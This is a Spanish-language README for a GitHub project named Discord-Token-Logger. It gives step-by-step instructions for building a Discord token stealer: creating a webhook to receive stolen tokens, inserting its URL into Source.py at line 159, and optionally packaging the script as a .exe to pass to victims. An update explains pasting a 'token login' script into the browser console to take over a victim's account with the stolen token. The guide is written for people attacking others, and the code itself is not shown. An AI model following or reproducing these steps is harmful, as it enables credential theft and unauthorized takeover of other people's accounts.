# ¿COMO LO USAMOS?
Antes de descargar el archivo **Source.py** debemos dirigirnos a nuestro Discord y crear un nuevo servidor (pueden poner el nombre que quieran). Teniendo el servidor creado debemos dirigirnos al apartado de **Ajustes del Servidor**, entrando aqui debemos buscar la opcion llamada **Integraciones** y le damos click

![image.png](https://raw.githubusercontent.com/G0ldenD4rk/Discord-Token-Logger/main/imagenes/Integraciones.png)

Estando aqui dentro debemos darle a **Crear WebHook**, cuando hagamos esto nos pedira que pongamos un nombre y elijamos un canal, esto es algo libre. (Pueden dejarlo como esta por defecto)

(**UNA ACLARACION BASTANTE IMPORTANTE: DEBEMOS TENER PYTHON INSTALADO EN NUESTRO WINDOWS, EN CASO DE QUE NO LO TENGAS, AQUI ESTA EL LINK DIRECTO A SU PAGINA DE DESCARGAS OFICIAL https://www.python.org/downloads/)**

Ahora ya estamos listos para descargar el archivo **Source.py**, como se hace esto? facil, solo debemos presionar el boton verde que se encuentra en el repositorio llamado **Code**, nos dara unas opciones y debemos darle a **Download ZIP** 

![image.png](https://raw.githubusercontent.com/G0ldenD4rk/Discord-Token-Logger/main/imagenes/Code.png)

Descomprimimos el archivo ZIP que nos dejo la descarga, la carpeta de **imagenes** y el archivo llamado **README.md** podemos eliminarlos tranquilamente, los unicos archivos que nos importa son el **Source.py** y el **discord token login.txt**, al primer archivo (el .py) le daremos click derecho y aparecera una opcion llamada **Edit With IDLE** y elegimos la version que nos aparezca 

![image.png](https://raw.githubusercontent.com/G0ldenD4rk/Discord-Token-Logger/main/imagenes/Edit.png)

Cuando elijamos esta opcion nos aparecera el codigo completo, lo que debemos hacer es deslizar el scroll hasta abajo del todo y buscar la palabra **WEBHOOK** (Esto se encuentra en la línea 159 del codigo)

![image.png](https://raw.githubusercontent.com/G0ldenD4rk/Discord-Token-Logger/main/imagenes/WebHook.png)

Ahora debemos volver a nuestro Discord y entrar en la WebHook que creamos (claro, si seguiste los pasos tal como aqui estan), alli nos aparecera una opcion llamada **Copiar URL de WebHook**, le hacemos click y volvemos al archivo que estabamos editando, aqui borramos la palabra **WEBHOOK** del codigo y la reemplazamos por el URL que copiamos antes.

![image.png](https://raw.githubusercontent.com/G0ldenD4rk/Discord-Token-Logger/main/imagenes/URL.png)

Una vez hecho esto lo unico que hacemos sera guardar el codigo. Y listo, tendriamos nuestro Token Logger creado.

Si queremos hacer que ese codigo sea un archivo .exe lo unico que haremos sera instalar la siguiente herramienta: https://github.com/brentvollebregt/auto-py-to-exe
En YouTube hay varios tutoriales que nos enseñan a hacer esto =).

# ACTUALIZACION 9/03/2022

Agregue un nuevo archivo llamado **token login script.txt**, **ESTE ARCHIVO NO LO DEBEMOS BORRAR, SOLO DEJAMOS EL SOURCE.PY Y ESTE .TXT**
Para que sirve?:
La funcion de esto es poder ingresar a la cuenta del usuario al que le sacamos su Token, el archivo tiene pocas lineas de codigo asi que sera muy facil usarlo, solo debemos reemplazar la palabra **TOKEN** que se encuentra en el codigo y ponemos la Token del usuario al que le pasamos nuestro Token Logger.

![image.png](https://raw.githubusercontent.com/G0ldenD4rk/Discord-Token-Logger/main/imagenes/txt.png)

Cuando hagamos esto debemos copiar el codigo e irnos a nuestro Discord de navegador, alli presionaremos F12 (o click derecho e inspeccionar elemento), buscaremos la opcion llamada **Console** y alli pegaremos el codigo, cuando hagamos esto entraremos automaticamente a la cuenta del usuario al que le sacamos su Token. 

# Contacto:
-GoldenDark-#5767
